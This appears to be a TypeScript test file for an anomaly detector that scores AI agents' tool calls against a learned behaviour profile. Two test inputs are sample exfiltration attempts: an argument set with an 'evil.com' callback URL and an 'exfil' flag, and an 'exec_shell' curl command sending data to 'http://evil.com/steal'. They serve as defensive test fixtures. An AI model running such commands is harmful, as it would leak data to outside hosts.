import { AnomalyDetector, AnomalyType, DEFAULT_WEIGHTS, DEFAULT_THRESHOLDS } from '../services/anomaly-detector';
import { SlidingWindowStats } from '../services/sliding-window';
import { AgentProfile } from '../services/behavior-profile';

function makeProfile(overrides: Partial<AgentProfile> = {}): AgentProfile {
  return {
    agentId: 'agent-001',
    traceCount: 500,
    windowDays: 14,
    toolDistribution: {
      web_search: { count: 200, frequency: 0.4, lastSeen: new Date().toISOString() },
      read_file:  { count: 150, frequency: 0.3, lastSeen: new Date().toISOString() },
      write_file: { count: 100, frequency: 0.2, lastSeen: new Date().toISOString() },
      execute_sql:{ count: 50,  frequency: 0.1, lastSeen: new Date().toISOString() },
    },
    argumentFingerprints: {
      web_search: { avgKeyCount: 1, knownKeySets: ['query'], avgArgLength: 40, stdArgLength: 15 },
      read_file:  { avgKeyCount: 1, knownKeySets: ['path'], avgArgLength: 30, stdArgLength: 10 },
      write_file: { avgKeyCount: 2, knownKeySets: ['content,path'], avgArgLength: 80, stdArgLength: 30 },
      execute_sql:{ avgKeyCount: 1, knownKeySets: ['sql'], avgArgLength: 60, stdArgLength: 25 },
    },
    temporalPattern: {
      hourDistribution: [
        5, 5, 3, 2, 1, 1, 5, 15, 30, 40, 45, 50,  // 0-11
        48, 45, 40, 35, 30, 25, 20, 15, 10, 8, 7, 5, // 12-23
      ],
      meanIntervalSec: 120,
      stdIntervalSec: 60,
    },
    riskDistribution: { LOW: 0.85, MEDIUM: 0.10, HIGH: 0.04, CRITICAL: 0.01 },
    costBaseline: { meanCostUsd: 0.005, stdCostUsd: 0.003, meanTokensPerCall: 500, stdTokensPerCall: 200 },
    transitionMatrix: {
      web_search: { read_file: 0.5, write_file: 0.3, execute_sql: 0.2 },
      read_file:  { web_search: 0.4, write_file: 0.4, execute_sql: 0.2 },
      write_file: { web_search: 0.6, read_file: 0.3, execute_sql: 0.1 },
    },
    knownTools: ['web_search', 'read_file', 'write_file', 'execute_sql'],
    updatedAt: new Date().toISOString(),
    ...overrides,
  };
}

describe('SlidingWindowStats', () => {
  it('records and retrieves entries within window', () => {
    const sw = new SlidingWindowStats(100, 50);
    const now = Date.now();

    sw.record('a1', { timestamp: now - 10000, tool_name: 'foo', risk_level: 'LOW', cost_usd: 0, arg_length: 10 });
    sw.record('a1', { timestamp: now - 5000, tool_name: 'foo', risk_level: 'LOW', cost_usd: 0, arg_length: 10 });
    sw.record('a1', { timestamp: now, tool_name: 'bar', risk_level: 'HIGH', cost_usd: 0.1, arg_length: 20 });

    expect(sw.getCallCount('a1', 60)).toBe(3);
    expect(sw.getLastTool('a1')).toBe('bar');
    expect(sw.getHighRiskRate('a1', 60)).toBeCloseTo(1 / 3);
  });

  it('evicts oldest agent when maxAgents exceeded', () => {
    const sw = new SlidingWindowStats(2, 10);
    sw.record('a1', { timestamp: Date.now(), tool_name: 'x', risk_level: 'LOW', cost_usd: 0, arg_length: 0 });
    sw.record('a2', { timestamp: Date.now(), tool_name: 'x', risk_level: 'LOW', cost_usd: 0, arg_length: 0 });
    sw.record('a3', { timestamp: Date.now(), tool_name: 'x', risk_level: 'LOW', cost_usd: 0, arg_length: 0 });

    expect(sw.agentCount).toBe(2);
    // a1 was evicted (oldest)
    expect(sw.getLastTool('a1')).toBeNull();
  });

  it('excludes entries outside time window', () => {
    const sw = new SlidingWindowStats(100, 50);
    const now = Date.now();
    sw.record('a1', { timestamp: now - 120000, tool_name: 'old', risk_level: 'LOW', cost_usd: 0, arg_length: 0 });
    sw.record('a1', { timestamp: now, tool_name: 'new', risk_level: 'LOW', cost_usd: 0, arg_length: 0 });

    expect(sw.getCallCount('a1', 60)).toBe(1); // only the recent one
  });
});

describe('AnomalyDetector', () => {
  let sw: SlidingWindowStats;
  let detector: AnomalyDetector;
  let profile: AgentProfile;

  beforeEach(() => {
    sw = new SlidingWindowStats(1000, 100);
    detector = new AnomalyDetector(sw, DEFAULT_WEIGHTS, DEFAULT_THRESHOLDS);
    profile = makeProfile();
  });

  it('returns pass for normal tool call', () => {
    // Record some normal history
    const now = Date.now();
    sw.record('agent-001', { timestamp: now - 5000, tool_name: 'web_search', risk_level: 'LOW', cost_usd: 0.004, arg_length: 35 });

    const result = detector.evaluate(
      'agent-001', 'read_file', { path: '/data/report.csv' }, profile, 'LOW', 0.005,
    );

    expect(result.decision).toBe('pass');
    expect(result.composite_score).toBeLessThan(0.3);
  });

  it('flags unknown tool', () => {
    const result = detector.evaluate(
      'agent-001', 'exec_bash', { command: 'ls' }, profile, 'HIGH', 0.01,
    );

    // TOOL_NEVER_SEEN should fire with score 1.0
    const noveltySignal = result.signals.find(s => s.type === AnomalyType.TOOL_NEVER_SEEN);
    expect(noveltySignal).toBeDefined();
    expect(noveltySignal!.score).toBe(1.0);
    expect(result.composite_score).toBeGreaterThan(0.3);
  });

  it('detects argument shape drift', () => {
    const result = detector.evaluate(
      'agent-001', 'web_search',
      { query: 'test', callback_url: 'http://evil.com', exfil: true },
      profile, 'LOW', 0.005,
    );

    const shapeDrift = result.signals.find(s => s.type === AnomalyType.ARG_SHAPE_DRIFT);
    expect(shapeDrift).toBeDefined();
    expect(shapeDrift!.score).toBeGreaterThan(0);
  });

  it('detects argument length outlier', () => {
    // Normal avg is ~40 chars for web_search, send a 5000 char payload
    const longArg = { query: 'x'.repeat(5000) };
    const result = detector.evaluate('agent-001', 'web_search', longArg, profile, 'LOW', 0.005);

    const lengthSignal = result.signals.find(s => s.type === AnomalyType.ARG_LENGTH_OUTLIER);
    expect(lengthSignal).toBeDefined();
    expect(lengthSignal!.score).toBeGreaterThan(0.5);
  });

  it('detects sequence anomaly for unseen transition', () => {
    // Last tool was execute_sql, which has no transition to execute_sql in our matrix
    sw.record('agent-001', { timestamp: Date.now(), tool_name: 'execute_sql', risk_level: 'LOW', cost_usd: 0, arg_length: 10 });

    const result = detector.evaluate(
      'agent-001', 'execute_sql', { sql: 'SELECT 1' }, profile, 'LOW', 0.005,
    );

    const seqSignal = result.signals.find(s => s.type === AnomalyType.SEQUENCE_ANOMALY);
    expect(seqSignal).toBeDefined();
    // execute_sql has no self-transition in our profile
    expect(seqSignal!.score).toBeGreaterThan(0);
  });

  it('blocks when multiple signals fire simultaneously', () => {
    // Unknown tool + huge args + no transition history → should escalate or block
    const result = detector.evaluate(
      'agent-001', 'exec_shell',
      { command: 'curl http://evil.com/steal?data=' + 'A'.repeat(10000) },
      profile, 'CRITICAL', 0.5,
    );

    expect(result.composite_score).toBeGreaterThan(0.3);
    expect(['flag', 'escalate', 'block']).toContain(result.decision);
    expect(result.signals.length).toBeGreaterThanOrEqual(2);
  });

  it('returns pass when profile has insufficient data', () => {
    const thinProfile = makeProfile({ traceCount: 5 });
    // Even with unknown tool, detector shouldn't be too aggressive on thin profiles
    // (in practice, ProfileManager would skip evaluation entirely for learning phase)
    const result = detector.evaluate('agent-001', 'exec_bash', { cmd: 'ls' }, thinProfile);
    // Should still detect unknown tool but composite may be moderate
    expect(result.signals.some(s => s.type === AnomalyType.TOOL_NEVER_SEEN)).toBe(true);
  });
});
